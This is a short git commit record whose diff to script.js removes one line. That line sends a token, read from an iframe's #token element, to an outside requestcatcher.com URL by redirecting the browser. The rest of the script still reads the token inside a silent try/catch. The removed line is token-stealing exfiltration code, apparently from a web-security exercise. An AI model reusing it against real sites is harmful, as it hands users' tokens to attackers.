a3c5f20270adc08ba5c5127b45015b16780c0e48
fullgitstack <mackormack0@gmail.com>
2025-10-10 15:20:38 +0200

    Update script.js

--- script.js
+++ script.js
@@ -1,6 +1,5 @@
 try {
 const ifr = document.querySelector("#principalIframe")
 const token = ifr.contentDocument.querySelector("#token")
-window.location.href = `https://uj54uj.requestcatcher.com/${token}`
 }catch(err) {
 }
